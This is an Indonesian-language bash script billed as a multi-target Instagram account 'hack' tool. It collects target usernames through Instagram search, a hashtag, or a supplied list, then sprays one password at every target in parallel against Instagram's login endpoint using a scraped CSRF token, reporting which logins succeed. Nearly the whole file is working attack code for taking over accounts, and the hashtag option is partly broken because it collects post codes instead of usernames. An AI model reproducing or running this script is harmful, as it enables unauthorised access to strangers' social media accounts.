#!/bin/bash

# Warna terminal
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# Limit threads
limit=100
clear

# Header
echo -e $'''
\033[1;31m ┏━┓┏━┓      \033[1;36m┏┳┓┳ ┳┳ ┏┳┓┳  ┏┓ ┳━┓┳ ┳┏┳┓┳━┓
\033[1;31m ┃┏┗┛┓┃      \033[1;36m┃┃┃┃ ┃┃  ┃ ┃  ┣┻┓┣┳┛┃ ┃ ┃ ┃┫
\033[1;31m ┗┓▋▋┏┛      \033[1;36m┻ ┻┗━┛┻━┛┻ ┻  ┗━┛┻┗━┗━┛ ┻ ┻━┛
\033[1;31m┏━┻┓╲┗━━━━┓┏┓       \033[1;34m┳━┓┏━┓┏━┓┏━┓┳━┓  ┳ ┳━┓
\033[1;31m┃▎▎┃╲╲╲╲╲╲┣━┛       \033[1;34m┃┫ ┃ ┃┣┳┛┃  ┃┫   ┃ ┃ ┓
\033[1;31m┗━┳┻▅┛╲╲╲╲┃         \033[1;34m┻  ┗━┛┻┗━┗━┛┻━┛  ┻ ┗━┛
\033[1;31m  ┗━┳┓┏┳┓┏┛ \033[1;37mAuthor   \033[1;31m: \033[1;36mM. Nopal Attasya
\033[1;31m    ┗┻┛┗┻┛  \033[1;37mInstagram\033[1;31m: \033[1;35m@nopal.kun
            \033[1;37mYouTube  \033[1;31m: \033[1;31mPAJAOQ\e[1;37m
\033[1;31m╔╦══════════════════════════════════════╦╗
\033[1;31m╠╝ \033[1;33m● \033[1;37mGunakan Tool Ini Dengan Bijak Ya!  \033[1;31m╚╣
\033[1;31m║   \033[1;37m Resikonya Kalian Tanggung Sendiri   \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝
\033[1;32m------------------------------------------'''

# Cek dependensi
dependencies=("jq" "curl")
for dep in "${dependencies[@]}"; do
    if ! command -v $dep &>/dev/null; then
        echo -e "${red}$dep tidak ditemukan. Install dengan: apt install $dep -y${white}"
        exit 1
    fi
done

# Menu
echo -e '''
\033[1;32m------------------------------------------
\033[1;37m[\033[1;33m1\033[1;37m] \033[1;33mDapatkan Target Melalui \e[1;35m@username\e[1;37m
\033[1;37m[\033[1;33m2\033[1;37m] \033[1;33mDapatkan Target Melalui \e[1;35m#hashtag\e[1;37m
\033[1;37m[\033[1;33m3\033[1;37m] \033[1;33mHack Akun Dari Daftar Target Saya
'''

read -p $'\033[1;36m[\033[1;33m+\033[1;36m] Pilih \033[1;31m: \e[1;33m' choice

touch target

# Fungsi utama untuk cracking
brute() {
    local username=$1
    local password=$2
    local token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)

    response=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
        -H "cookie: csrftoken=${token}" \
        -H "origin: https://www.instagram.com" \
        -H "referer: https://www.instagram.com/accounts/login/" \
        -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
        -H "x-csrftoken: ${token}" \
        -H "x-requested-with: XMLHttpRequest" \
        -d "username=${username}&password=${password}")

    if echo "$response" | grep -q '"authenticated":true'; then
        echo -e "[${green}+${white}] Berhasil: @$username dengan password: $password"
    elif echo "$response" | grep -q '"checkpoint_required"'; then
        echo -e "[${cyan}?${white}] Checkpoint: @$username"
    else
        echo -e "[${red}!${white}] Gagal: @$username"
    fi
}

# Pilihan menu
case $choice in
1)
    read -p $'\033[1;36m[\033[1;33m?\033[1;36m] Input username \033[1;31m: \e[1;33m' username
    curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${username}" | jq -r '.users[].user.username' >target
    echo -e "[${blue}+${white}] Jumlah target ditemukan: $(wc -l <target)"
    read -p $'\033[1;36m[\033[1;33m?\033[1;36m] Masukkan password \033[1;31m: \e[1;33m' password

    for user in $(cat target); do
        ((thread = thread % limit))
        ((thread++ == 0)) && wait
        brute "$user" "$password" &
    done
    wait
    ;;
2)
    read -p $'\033[1;36m[\033[1;33m?\033[1;36m] Input hashtag \033[1;31m: \e[1;33m' hashtag
    response=$(curl -s "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
    if echo "$response" | grep -q '"status":"ok"'; then
        echo "$response" | jq -r '.data.hashtag.edge_hashtag_to_media.edges[].node.shortcode' >result
        sort -u result >target
        echo -e "[${blue}+${white}] Jumlah target dari hashtag: $(wc -l <target)"
        read -p $'\033[1;36m[\033[1;33m?\033[1;36m] Masukkan password \033[1;31m: \e[1;33m' password

        for user in $(cat target); do
            ((thread = thread % limit))
            ((thread++ == 0)) && wait
            brute "$user" "$password" &
        done
        wait
        rm result
    else
        echo -e "${red}Hashtag tidak ditemukan!${white}"
    fi
    ;;
3)
    read -p $'\033[1;36m[\033[1;33m?\033[1;36m] Masukkan file daftar target \033[1;31m: \e[1;33m' list
    if [[ -f "$list" ]]; then
        cat "$list" >target
        echo -e "[${blue}+${white}] Total target: $(wc -l <target)"
        read -p $'\033[1;36m[\033[1;33m?\033[1;36m] Masukkan password \033[1;31m: \e[1;33m' password

        for user in $(cat target); do
            ((thread = thread % limit))
            ((thread++ == 0)) && wait
            brute "$user" "$password" &
        done
        wait
    else
        echo -e "${red}File tidak ditemukan!${white}"
    fi
    ;;
*)
    echo -e "${red}Pilihan tidak valid!${white}"
    ;;
esac

# Bersihkan file sementara
rm -f target
